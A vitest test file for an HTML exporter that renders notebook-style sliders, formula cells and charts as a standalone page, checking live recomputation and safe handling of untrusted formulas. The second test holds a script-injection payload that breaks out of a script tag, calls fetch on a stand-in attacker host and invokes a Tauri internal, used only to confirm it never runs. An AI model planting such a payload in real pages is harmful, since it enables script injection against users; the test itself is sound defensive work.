import {afterEach, describe, expect, it, vi} from 'vitest';
import type {PageSnapshot} from '@book.dev/sdk';
import {toHtml} from '../toHtml';

let moduleSequence = 0;

const snapshot = (
  blocks: Array<{id: string; type: string; data: Record<string, unknown>}>,
  values: Array<[string, unknown]>,
): PageSnapshot => ({editorjs: {blocks}, values, names: []} as never);

async function runStandalone(html: string): Promise<void> {
  const body = html.match(/<body[^>]*>([\s\S]*?)<\/body>/)?.[1];
  const runtime = html.match(/<script type="module">([\s\S]*?)<\/script>/)?.[1];
  expect(body).toBeTruthy();
  expect(runtime).toBeTruthy();
  document.body.innerHTML = body!;
  const url = `data:text/javascript;charset=utf-8,${encodeURIComponent(runtime!)}#ob-${moduleSequence++}`;
  await import(/* @vite-ignore */ url);
}

afterEach(() => {
  vi.unstubAllGlobals();
  delete (window as unknown as {__TAURI_INTERNALS__?: unknown}).__TAURI_INTERNALS__;
  document.body.innerHTML = '';
});

describe('headless standalone safe runtime', () => {
  it('round-trips a slider through a compound formula into a live chart', async () => {
    const html = toHtml(
      snapshot(
        [
          {id: 'slider', type: 'slider', data: {name: 'n', min: 0, max: 10, step: 1, initial: 3}},
          {
            id: 'compound',
            type: 'expr',
            data: {name: 'compound', source: 'Math.round((__C__{slider}__ ** 2 + Math.pow(__C__{slider}__, 2)) / 2) >= 9 ? __C__{slider}__ * 3 + 1 : 0'},
          },
          {
            id: 'series',
            type: 'expr',
            data: {name: 'series', source: '[__C__{slider}__, __C__{compound}__, Math.max(__C__{slider}__, __C__{compound}__) - 1]'},
          },
          {id: 'chart', type: 'chart', data: {refCellIds: ['series'], kind: 'bar', title: 'Compound', labels: 'input, result, result − 1'}},
        ],
        [['slider', 3], ['compound', 10], ['series', [3, 10, 9]]],
      ),
      'Runtime parity',
      '',
    );

    await runStandalone(html);
    const compound = document.querySelector<HTMLElement>('[data-cell="compound"] [data-val]');
    const series = document.querySelector<HTMLElement>('[data-cell="series"] [data-val]');
    const chart = document.querySelector<HTMLElement>('[data-chart="chart-0"]');
    expect(compound?.textContent).toBe('10');
    expect(series?.textContent).toBe('[3, 10, 9]');
    expect(chart?.querySelectorAll('rect').length).toBeGreaterThanOrEqual(3);
    const initialChart = chart?.innerHTML;

    const input = document.querySelector<HTMLInputElement>('[data-cell="slider"] input[type="range"]')!;
    input.value = '4';
    input.dispatchEvent(new Event('input', {bubbles: true}));

    // Same expression result as the in-app JS grammar for n=4:
    // round((4² + pow(4,2))/2) >= 9 ? 4*3+1 : 0 → 13.
    expect(compound?.textContent).toBe('13');
    expect(series?.textContent).toBe('[4, 13, 12]');
    expect(chart?.innerHTML).not.toBe(initialChart);
    expect(document.querySelector('[data-cell="slider"] output')?.textContent).toBe('4');
  });

  it('keeps the last value and never runs a hostile unsupported formula', async () => {
    const fetchSpy = vi.fn();
    const invokeSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);
    (window as unknown as {__TAURI_INTERNALS__?: unknown}).__TAURI_INTERNALS__ = {invoke: invokeSpy};
    const attack = '</script><script>fetch("https://attacker.invalid");window.__TAURI_INTERNALS__.invoke("pwn")</script>';
    const html = toHtml(
      snapshot(
        [
          {id: 'slider', type: 'slider', data: {name: 'n', min: 0, max: 10, initial: 1}},
          {id: 'bad', type: 'expr', data: {name: 'bad', source: attack}},
        ],
        [['slider', 1], ['bad', 42]],
      ),
      'Hostile formula',
      '',
    );

    await runStandalone(html);
    expect(document.querySelector('[data-cell="bad"] [data-val]')?.textContent).toBe('42');
    const input = document.querySelector<HTMLInputElement>('[data-cell="slider"] input')!;
    input.value = '2';
    input.dispatchEvent(new Event('input', {bubbles: true}));
    expect(document.querySelector('[data-cell="bad"] [data-val]')?.textContent).toBe('42');
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(invokeSpy).not.toHaveBeenCalled();
  });
});
